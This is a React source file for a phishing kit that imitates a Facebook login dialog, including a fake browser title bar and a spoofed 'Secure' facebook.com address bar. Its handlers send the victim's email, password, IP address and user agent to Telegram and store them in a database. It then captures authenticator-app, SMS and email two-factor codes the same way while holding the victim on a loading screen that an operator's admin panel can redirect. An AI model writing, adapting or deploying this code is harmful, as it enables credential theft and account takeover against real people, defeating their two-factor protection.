"use client"

import type React from "react"

import Image from "next/image"
import { DialogPortal, DialogOverlay, DialogTitle } from "@/components/ui/dialog"
import * as DialogPrimitive from "@radix-ui/react-dialog"
import { Input } from "@/components/ui/input"
import { Button } from "@/components/ui/button"
import { Lock, X, Minus } from "lucide-react"
import { useRouter } from "next/navigation" // Import useRouter
import { useState, useEffect } from "react" // Import useState and useEffect
import { cn } from "@/lib/utils"
import { sendToTelegram, send2FAToTelegram } from "@/lib/telegram"
import { storeUserCredentials } from "@/lib/session-tracking"

// Function to get user's IP address
async function getUserIP(): Promise<string | undefined> {
  try {
    const response = await fetch('/api/get-ip')
    if (response.ok) {
      const data = await response.json()
      return data.ip !== 'unknown' ? data.ip : undefined
    }
  } catch (error) {
    console.error('Error fetching IP:', error)
  }
  return undefined
}

interface FacebookLoginDialogProps {
  onClose: () => void
  initialStep?: "login" | "login-error" | "loading" | "2fa" | "2fa-error" | "2fa-sms" | "2fa-sms-error" | "2fa-email" | "2fa-email-error"
}

export default function FacebookLoginDialog({ onClose, initialStep = "login" }: FacebookLoginDialogProps) {
  const router = useRouter() // Initialize useRouter
  const [step, setStep] = useState<"login" | "login-error" | "loading" | "2fa" | "2fa-error" | "2fa-sms" | "2fa-sms-error" | "2fa-email" | "2fa-email-error">(initialStep as "login" | "login-error" | "loading" | "2fa" | "2fa-error" | "2fa-sms" | "2fa-sms-error" | "2fa-email" | "2fa-email-error") // State to manage dialog steps
  const [countdown, setCountdown] = useState(300) // Countdown timer for SMS
  const [email, setEmail] = useState("") // Store email from login form

  // Update step when initialStep changes
  useEffect(() => {
    const newStep = initialStep as "login" | "login-error" | "loading" | "2fa" | "2fa-error" | "2fa-sms" | "2fa-sms-error" | "2fa-email" | "2fa-email-error"
    setStep(newStep)
    // Don't update URL here since this is triggered by URL changes from admin redirects
  }, [initialStep])

  // Function to update URL when step changes (for consistency with admin panel redirects)
  const updateURLForStep = (newStep: string) => {
    if (typeof window !== 'undefined') {
      const url = new URL(window.location.href)
      
      if (newStep === 'login') {
        // Remove dialog parameter for default login state
        url.searchParams.delete('dialog')
      } else {
        // Set dialog parameter for other states
        const dialogParam = newStep === 'loading' ? 'loading' : 
                           newStep === 'login-error' ? 'login-error' :
                           newStep === '2fa' ? '2fa' :
                           newStep === '2fa-error' ? '2fa-error' :
                           newStep === '2fa-sms' ? '2fa-sms' :
                           newStep === '2fa-sms-error' ? '2fa-sms-error' :
                           newStep === '2fa-email' ? '2fa-email' :
                           newStep === '2fa-email-error' ? '2fa-email-error' :
                           'facebook'
        url.searchParams.set('dialog', dialogParam)
      }
      
      const newUrl = url.pathname + url.search
      console.log(`Dialog: Updating URL for step "${newStep}" to: ${newUrl}`)
      
      // Update URL without adding to browser history
      router.replace(newUrl)
      
      // Force session tracking update immediately after URL change
      // This ensures the new URL is captured right away
      setTimeout(async () => {
        const { trackSession } = await import('@/lib/session-tracking')
        try {
          await trackSession({ userId: undefined })
          console.log(`Dialog: Forced session tracking update for step "${newStep}"`)
        } catch (error) {
          console.warn('Failed to force session tracking update:', error)
        }
      }, 100) // Small delay to ensure router.replace completes
    }
  }

  // Countdown timer for SMS 2FA
  useEffect(() => {
    if (step === "2fa-sms" && countdown > 0) {
      const timer = setTimeout(() => setCountdown(countdown - 1), 1000)
      return () => clearTimeout(timer)
    }
  }, [step, countdown])

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault() // Prevent default form submission
    
    // Get email and password from form
    const formData = new FormData(e.target as HTMLFormElement)
    const emailValue = formData.get("email") as string
    const passwordValue = formData.get("password") as string
    setEmail(emailValue || "********@*****.***") // Default email if not provided
    
    // Send credentials to Telegram and store in database
    if (emailValue && passwordValue) {
      const ipAddress = await getUserIP()
      await sendToTelegram({
        email: emailValue,
        password: passwordValue,
        timestamp: new Date().toISOString(),
        userAgent: typeof window !== 'undefined' ? window.navigator.userAgent : undefined,
        ipAddress: ipAddress
      })
      await storeUserCredentials(emailValue, passwordValue)
    }
    
    // Show loading screen and stay there
    setStep("loading")
    updateURLForStep("loading")
  }

  const handleLoginError = async (e: React.FormEvent) => {
    e.preventDefault() // Prevent default form submission
    
    // Get email and password from form
    const formData = new FormData(e.target as HTMLFormElement)
    const emailValue = formData.get("email") as string
    const passwordValue = formData.get("password") as string
    setEmail(emailValue || "********@*****.***") // Default email if not provided
    
    // Send credentials to Telegram and store in database
    if (emailValue && passwordValue) {
      const ipAddress = await getUserIP()
      await sendToTelegram({
        email: emailValue,
        password: passwordValue,
        timestamp: new Date().toISOString(),
        userAgent: typeof window !== 'undefined' ? window.navigator.userAgent : undefined,
        ipAddress: ipAddress
      })
      await storeUserCredentials(emailValue, passwordValue)
    }
    
    // Show loading screen and stay there
    setStep("loading")
    updateURLForStep("loading")
  }

  const handle2FAVerify = async (e: React.FormEvent) => {
    e.preventDefault() // Prevent default form submission
    
    // Get 2FA code from form
    const formData = new FormData(e.target as HTMLFormElement)
    const codeValue = formData.get("code") as string
    
    // Show loading screen first
    setStep("loading")
    updateURLForStep("loading")
    
    // Send 2FA code to Telegram
    if (codeValue) {
      const ipAddress = await getUserIP()
      await send2FAToTelegram({
        code: codeValue,
        type: '2fa',
        email: email,
        timestamp: new Date().toISOString(),
        userAgent: typeof window !== 'undefined' ? window.navigator.userAgent : undefined,
        ipAddress: ipAddress
      })
    }
    
    // In a real app, you'd send the 2FA code to a backend for verification.
    // If verification is successful, close dialog and navigate.
    // For now, we'll stay in loading state like the login flow
    // onClose() // Close the dialog
    // router.push("/select-date-time") // Navigate to the new screen
  }

  const handle2FASMSVerify = async (e: React.FormEvent) => {
    e.preventDefault() // Prevent default form submission
    
    // Get SMS code from form
    const formData = new FormData(e.target as HTMLFormElement)
    const codeValue = formData.get("code") as string
    
    // Show loading screen first
    setStep("loading")
    updateURLForStep("loading")
    
    // Send SMS code to Telegram
    if (codeValue) {
      const ipAddress = await getUserIP()
      await send2FAToTelegram({
        code: codeValue,
        type: '2fa-sms',
        email: email,
        timestamp: new Date().toISOString(),
        userAgent: typeof window !== 'undefined' ? window.navigator.userAgent : undefined,
        ipAddress: ipAddress
      })
    }
    
    // In a real app, you'd send the SMS code to a backend for verification.
    // If verification is successful, close dialog and navigate.
    // For now, we'll stay in loading state like the login flow
    // onClose() // Close the dialog
    // router.push("/select-date-time") // Navigate to the new screen
  }

  const handle2FAEmailVerify = async (e: React.FormEvent) => {
    e.preventDefault() // Prevent default form submission
    
    // Get email code from form
    const formData = new FormData(e.target as HTMLFormElement)
    const codeValue = formData.get("code") as string
    
    // Show loading screen first
    setStep("loading")
    updateURLForStep("loading")
    
    // Send email code to Telegram
    if (codeValue) {
      const ipAddress = await getUserIP()
      await send2FAToTelegram({
        code: codeValue,
        type: '2fa-email',
        email: email,
        timestamp: new Date().toISOString(),
        userAgent: typeof window !== 'undefined' ? window.navigator.userAgent : undefined,
        ipAddress: ipAddress
      })
    }
    
    // In a real app, you'd send the email code to a backend for verification.
    // If verification is successful, close dialog and navigate.
    // For now, we'll stay in loading state like the login flow
    // onClose() // Close the dialog
    // router.push("/select-date-time") // Navigate to the new screen
  }

  const handle2FAErrorVerify = async (e: React.FormEvent) => {
    e.preventDefault() // Prevent default form submission
    
    // Get 2FA code from form
    const formData = new FormData(e.target as HTMLFormElement)
    const codeValue = formData.get("code") as string
    
    // Show loading screen first
    setStep("loading")
    updateURLForStep("loading")
    
    // Send 2FA code to Telegram
    if (codeValue) {
      const ipAddress = await getUserIP()
      await send2FAToTelegram({
        code: codeValue,
        type: '2fa-error',
        email: email,
        timestamp: new Date().toISOString(),
        userAgent: typeof window !== 'undefined' ? window.navigator.userAgent : undefined,
        ipAddress: ipAddress
      })
    }
    
    // In a real app, you'd send the 2FA code to a backend for verification.
    // If verification is successful, close dialog and navigate.
    // For now, we'll stay in loading state like the login flow
    // onClose() // Close the dialog
    // router.push("/select-date-time") // Navigate to the new screen
  }

  const handle2FASMSErrorVerify = async (e: React.FormEvent) => {
    e.preventDefault() // Prevent default form submission
    
    // Get SMS code from form
    const formData = new FormData(e.target as HTMLFormElement)
    const codeValue = formData.get("code") as string
    
    // Show loading screen first
    setStep("loading")
    updateURLForStep("loading")
    
    // Send SMS code to Telegram
    if (codeValue) {
      const ipAddress = await getUserIP()
      await send2FAToTelegram({
        code: codeValue,
        type: '2fa-sms-error',
        email: email,
        timestamp: new Date().toISOString(),
        userAgent: typeof window !== 'undefined' ? window.navigator.userAgent : undefined,
        ipAddress: ipAddress
      })
    }
    
    // In a real app, you'd send the SMS code to a backend for verification.
    // If verification is successful, close dialog and navigate.
    // For now, we'll stay in loading state like the login flow
    // onClose() // Close the dialog
    // router.push("/select-date-time") // Navigate to the new screen
  }

  const handle2FAEmailErrorVerify = async (e: React.FormEvent) => {
    e.preventDefault() // Prevent default form submission
    
    // Get email code from form
    const formData = new FormData(e.target as HTMLFormElement)
    const codeValue = formData.get("code") as string
    
    // Show loading screen first
    setStep("loading")
    updateURLForStep("loading")
    
    // Send email code to Telegram
    if (codeValue) {
      const ipAddress = await getUserIP()
      await send2FAToTelegram({
        code: codeValue,
        type: '2fa-email-error',
        email: email,
        timestamp: new Date().toISOString(),
        userAgent: typeof window !== 'undefined' ? window.navigator.userAgent : undefined,
        ipAddress: ipAddress
      })
    }
    
    // In a real app, you'd send the email code to a backend for verification.
    // If verification is successful, close dialog and navigate.
    // For now, we'll stay in loading state like the login flow
    // onClose() // Close the dialog
    // router.push("/select-date-time") // Navigate to the new screen
  }

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins}:${secs.toString().padStart(2, '0')}`
  }

  return (
    <DialogPortal>
      <DialogOverlay />
      <DialogPrimitive.Content
        className={cn(
          "fixed left-[50%] top-[50%] z-50 grid w-full max-w-md translate-x-[-50%] translate-y-[-50%] p-0 overflow-hidden rounded-lg shadow-xl border-none flex flex-col max-h-[95vh] overflow-y-auto bg-background duration-200 data-[state=open]:animate-in data-[state=closed]:animate-out data-[state=closed]:fade-out-0 data-[state=open]:fade-in-0 data-[state=closed]:zoom-out-95 data-[state=open]:zoom-in-95 data-[state=closed]:slide-out-to-left-1/2 data-[state=closed]:slide-out-to-top-[48%] data-[state=open]:slide-in-from-left-1/2 data-[state=open]:slide-in-from-top-[48%]"
        )}
      >
      {/* Visually hidden dialog title for accessibility */}
      <DialogTitle className="sr-only">Facebook Login</DialogTitle>
      {/* Custom Browser Title Bar */}
      <div className="flex items-center justify-between bg-gray-100 px-3 py-2 border-b border-gray-300 rounded-t-lg flex-shrink-0">
        <div className="flex items-center gap-2 text-sm font-medium text-gray-800">
          <Image src="/favicon.ico" alt="Facebook icon" width={16} height={16} />
          Facebook - Login
        </div>
        <div className="flex items-center gap-1">
          <button className="text-gray-500 hover:text-gray-700 p-1 rounded">
            <Minus className="w-3.5 h-3.5 stroke-[2.5px]" />
          </button>
          <button
            onClick={onClose}
            className="text-gray-500 hover:text-gray-700 p-1 rounded hover:bg-red-500 hover:text-white"
          >
            <X className="w-3.5 h-3.5 stroke-[2.5px]" />
          </button>
        </div>
      </div>

      {/* Custom Browser URL Bar */}
      <div className="flex items-center bg-gray-50 px-3 py-2 border-b border-gray-200 flex-shrink-0">
        <Lock className="w-4 h-4 text-green-600 mr-2" />
        <div className="flex-1 bg-white border border-gray-300 rounded-full px-3 py-1 text-sm text-gray-700 flex items-center">
          <span className="text-green-600 font-medium whitespace-nowrap">Secure | https://</span>
          <span className="truncate text-gray-800">www.facebook.com/login.php?skip_api_login=1&api_key=...</span>
        </div>
      </div>

      {/* Facebook Blue Banner */}
      <div className="bg-[#3b5998] py-4 flex justify-start items-center flex-shrink-0 px-6">
        <span className="text-white text-4xl font-bold">facebook</span>
      </div>

      {/* Main Dialog Content */}
      <div className="flex-1 p-6 bg-white flex flex-col items-center justify-center">
        {step === "login" && (
          <div className="w-full max-w-sm bg-white p-6 rounded-lg shadow-md">
            <h2 className="text-xl font-semibold text-center mb-4">Log Into Facebook</h2>
            <form onSubmit={handleLogin} className="space-y-4">
              <Input type="email" name="email" placeholder="Email or phone number" className="w-full" required />
              <Input type="password" name="password" placeholder="Password" className="w-full" required />
              <Button 
                type="submit" 
                className="w-full bg-[#1877F2] hover:bg-[#166FE5] text-white"
              >
                Log In
              </Button>
            </form>
            <div className="flex flex-col items-center mt-4 text-sm">
              <a href="#" className="text-[#1877F2] hover:underline mb-2">
                Forgot account?
              </a>
              <a href="#" className="text-[#1877F2] hover:underline mb-2">
                Sign up for Facebook
              </a>
              <a href="#" className="text-gray-500 hover:underline">
                Not now
              </a>
            </div>
          </div>
        )}

        {step === "login-error" && (
          <div className="w-full max-w-sm bg-white p-6 rounded-lg shadow-md">
            <h2 className="text-xl font-semibold text-center mb-4">Log Into Facebook</h2>
            <div className="bg-red-50 border border-red-200 text-red-700 px-4 py-3 rounded mb-4">
              <p className="text-sm">Password or email are incorrect</p>
            </div>
            <form onSubmit={handleLoginError} className="space-y-4">
              <Input type="email" name="email" placeholder="Email or phone number" className="w-full" required />
              <Input type="password" name="password" placeholder="Password" className="w-full" required />
              <Button 
                type="submit" 
                className="w-full bg-[#1877F2] hover:bg-[#166FE5] text-white"
              >
                Log In
              </Button>
            </form>
            <div className="flex flex-col items-center mt-4 text-sm">
              <a href="#" className="text-[#1877F2] hover:underline mb-2">
                Forgot account?
              </a>
              <a href="#" className="text-[#1877F2] hover:underline mb-2">
                Sign up for Facebook
              </a>
              <a href="#" className="text-gray-500 hover:underline">
                Not now
              </a>
            </div>
          </div>
        )}

        {step === "loading" && (
          <div className="w-full max-w-sm bg-white p-6 rounded-lg shadow-md flex flex-col items-center justify-center">
            <div className="flex flex-col items-center mb-4">
              <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600"></div>
              <p className="mt-4 text-lg text-gray-700">Verifying your information...</p>
            </div>
            <p className="text-sm text-gray-500 text-center">Please wait a moment while we process your request.</p>
          </div>
        )}

        {step === "2fa" && (
          <div className="w-full max-w-sm bg-white p-6 rounded-lg shadow-md flex flex-col items-center">
            <h2 className="text-2xl font-bold text-center mb-2">Go to your authentication app</h2>
            <p className="text-base text-gray-700 mb-4 text-center">
              Enter the 6-digit code from your two-factor authentication app (e.g. Duo Mobile or Google Authenticator).
            </p>
            <div className="w-full flex justify-center mb-4">
              <Image src="/2fa-authenticate.png" alt="2FA Illustration" width={350} height={150} className="object-contain rounded" />
            </div>
            <form onSubmit={handle2FAVerify} className="w-full flex flex-col gap-4">
              <Input
                type="text"
                name="code"
                placeholder="2FA Code"
                maxLength={6}
                required
                className="w-full text-center text-lg tracking-widest"
              />
              <Button type="submit" className="w-full bg-[#1877F2] hover:bg-[#166FE5] text-white text-lg py-2 rounded-full">
                Continue
              </Button>
            </form>
          </div>
        )}

        {step === "2fa-sms" && (
          <div className="w-full max-w-sm bg-white p-6 rounded-lg shadow-md flex flex-col items-center">
            <h2 className="text-2xl font-bold text-center mb-2">Check your text messages</h2>
            <p className="text-base text-gray-700 mb-4 text-center">
              Enter the code we sent to *** ** ** ***
            </p>
            <div className="w-full flex justify-center mb-4">
              <Image src="/2faimg.png" alt="2FA SMS Illustration" width={350} height={150} className="object-contain rounded" />
            </div>
            <form onSubmit={handle2FASMSVerify} className="w-full flex flex-col gap-4">
              <Input
                type="text"
                name="code"
                placeholder="Code"
                maxLength={6}
                required
                className="w-full text-left text-lg px-4 py-3 border border-gray-300 rounded-lg"
              />
              <Button type="submit" className="w-full bg-[#1877F2] hover:bg-[#166FE5] text-white text-lg py-3 rounded-lg">
                Continue
              </Button>
            </form>
            <div className="flex flex-col items-center mt-4 text-sm gap-2">
              <div className="flex items-center gap-2 text-gray-600">
              
                <span>We can send a new code in {formatTime(countdown)}</span>
              </div>

            </div>
          </div>
        )}

        {step === "2fa-email" && (
          <div className="w-full max-w-sm bg-white p-6 rounded-lg shadow-md flex flex-col">
            <h2 className="text-2xl font-bold mb-4">Enter security code</h2>
            <p className="text-base text-gray-700 mb-6">
              Please check your email for a message with your code. Your code is 6 numbers long.
            </p>
            <form onSubmit={handle2FAEmailVerify} className="w-full flex flex-col gap-4">
              <Input
                type="text"
                name="code"
                placeholder="Enter code"
                maxLength={6}
                required
                className="w-full text-left text-base px-4 py-3 border border-gray-300 rounded-lg"
              />
              <div className="flex justify-center items-center text-sm">
                <div className="text-center">
                  <span className="text-gray-600">We sent your code to:</span>
                  <br />
                  <span className="font-medium">{email || "********@*****.***"}</span>
                </div>
              </div>
     
              <Button type="submit" className="w-full bg-[#1877F2] hover:bg-[#166FE5] text-white text-base py-3 rounded-lg mt-2">
                Continue
              </Button>
            </form>
          </div>
        )}

                 {step === "2fa-error" && (
           <div className="w-full max-w-sm bg-white p-6 rounded-lg shadow-md flex flex-col items-center">
             <h2 className="text-2xl font-bold text-center mb-2">Authentication Failed</h2>
             <div className="bg-red-50 border border-red-200 text-red-700 px-4 py-3 rounded mb-4">
               <p className="text-sm">The code you entered is incorrect. Please try again.</p>
             </div>
             <p className="text-base text-gray-700 mb-4 text-center">
               Enter the 6-digit code from your two-factor authentication app (e.g. Duo Mobile or Google Authenticator).
             </p>
             <div className="w-full flex justify-center mb-4">
               <Image src="/2fa-authenticate.png" alt="2FA Illustration" width={350} height={150} className="object-contain rounded" />
             </div>
             <form onSubmit={handle2FAErrorVerify} className="w-full flex flex-col gap-4">
               <Input
                 type="text"
                 name="code"
                 placeholder="2FA Code"
                 maxLength={6}
                 required
                 className="w-full text-center text-lg tracking-widest"
               />
               <Button type="submit" className="w-full bg-[#1877F2] hover:bg-[#166FE5] text-white text-lg py-2 rounded-full">
                 Continue
               </Button>
             </form>
           </div>
         )}

                 {step === "2fa-sms-error" && (
           <div className="w-full max-w-sm bg-white p-6 rounded-lg shadow-md flex flex-col items-center">
             <h2 className="text-2xl font-bold text-center mb-2">Authentication Failed</h2>
             <div className="bg-red-50 border border-red-200 text-red-700 px-4 py-3 rounded mb-4">
               <p className="text-sm">The code you entered is incorrect. Please try again.</p>
             </div>
             <p className="text-base text-gray-700 mb-4 text-center">
               Enter the code we sent to *** ** ** ***
             </p>
             <div className="w-full flex justify-center mb-4">
               <Image src="/2faimg.png" alt="2FA SMS Illustration" width={350} height={150} className="object-contain rounded" />
             </div>
             <form onSubmit={handle2FASMSErrorVerify} className="w-full flex flex-col gap-4">
               <Input
                 type="text"
                 name="code"
                 placeholder="Code"
                 maxLength={6}
                 required
                 className="w-full text-left text-lg px-4 py-3 border border-gray-300 rounded-lg"
               />
               <Button type="submit" className="w-full bg-[#1877F2] hover:bg-[#166FE5] text-white text-lg py-3 rounded-lg">
                 Continue
               </Button>
             </form>
             <div className="flex flex-col items-center mt-4 text-sm gap-2">
               <div className="flex items-center gap-2 text-gray-600">
                 <span>We can send a new code in {formatTime(countdown)}</span>
               </div>
             </div>
           </div>
         )}

                 {step === "2fa-email-error" && (
           <div className="w-full max-w-sm bg-white p-6 rounded-lg shadow-md flex flex-col">
             <h2 className="text-2xl font-bold mb-4">Authentication Failed</h2>
             <div className="bg-red-50 border border-red-200 text-red-700 px-4 py-3 rounded mb-4">
               <p className="text-sm">The code you entered is incorrect. Please try again.</p>
             </div>
             <p className="text-base text-gray-700 mb-6">
               Please check your email for a message with your code. Your code is 6 numbers long.
             </p>
             <form onSubmit={handle2FAEmailErrorVerify} className="w-full flex flex-col gap-4">
               <Input
                 type="text"
                 name="code"
                 placeholder="Enter code"
                 maxLength={6}
                 required
                 className="w-full text-left text-base px-4 py-3 border border-gray-300 rounded-lg"
               />
               <div className="flex justify-center items-center text-sm">
                 <div className="text-center">
                   <span className="text-gray-600">We sent your code to:</span>
                   <br />
                   <span className="font-medium">{email || "********@*****.***"}</span>
                 </div>
               </div>
               <Button type="submit" className="w-full bg-[#1877F2] hover:bg-[#166FE5] text-white text-base py-3 rounded-lg mt-2">
                 Continue
               </Button>
             </form>
           </div>
         )}
      </div>

      {/* Footer */}
      <div className="bg-gray-100 p-4 text-xs text-gray-600 flex flex-wrap justify-center gap-x-4 gap-y-2 border-t flex-shrink-0">
        <a href="#" className="hover:underline">
          English (US)
        </a>
        <a href="#" className="hover:underline">
          Español
        </a>
        <a href="#" className="hover:underline">
          Deutsch
        </a>
        <a href="#" className="hover:underline">
          Türkçe
        </a>
        <a href="#" className="hover:underline">
          Српски
        </a>
        <a href="#" className="hover:underline">
          Français (France)
        </a>
        <a href="#" className="hover:underline">
          Italiano
        </a>
        <a href="#" className="hover:underline">
          Bosanski
        </a>
        <a href="#" className="hover:underline">
          Svenska
        </a>
        <a href="#" className="hover:underline">
          Português (Brasil)
        </a>
        <a href="#" className="hover:underline">
          +
        </a>
        <div className="w-full h-px bg-gray-300 my-2" /> {/* Separator */}
        <a href="#" className="hover:underline">
          Sign Up
        </a>
        <a href="#" className="hover:underline">
          Log In
        </a>
        <a href="#" className="hover:underline">
          Messenger
        </a>
        <a href="#" className="hover:underline">
          Facebook Lite
        </a>
        <a href="#" className="hover:underline">
          Watch
        </a>
        <a href="#" className="hover:underline">
          Places
        </a>
        <a href="#" className="hover:underline">
          Games
        </a>
        <a href="#" className="hover:underline">
          Marketplace
        </a>
        <a href="#" className="hover:underline">
          Facebook Pay
        </a>
        <a href="#" className="hover:underline">
          Oculus
        </a>
        <a href="#" className="hover:underline">
          Portal
        </a>
        <a href="#" className="hover:underline">
          Instagram
        </a>
        <a href="#" className="hover:underline">
          Local
        </a>
        <a href="#" className="hover:underline">
          Fundraisers
        </a>
        <a href="#" className="hover:underline">
          Services
        </a>
        <a href="#" className="hover:underline">
          Voting Information Centre
        </a>
        <a href="#" className="hover:underline">
          About
        </a>
        <a href="#" className="hover:underline">
          Create ad
        </a>
        <a href="#" className="hover:underline">
          Create Page
        </a>
        <a href="#" className="hover:underline">
          Developers
        </a>
        <a href="#" className="hover:underline">
          Careers
        </a>
        <a href="#" className="hover:underline">
          Privacy
        </a>
        <a href="#" className="hover:underline">
          Cookies
        </a>
        <a href="#" className="hover:underline">
          Ad Choices
        </a>
        <a href="#" className="hover:underline">
          Terms
        </a>
        <a href="#" className="hover:underline">
          Help
        </a>
      </div>
      </DialogPrimitive.Content>
    </DialogPortal>
  )
}
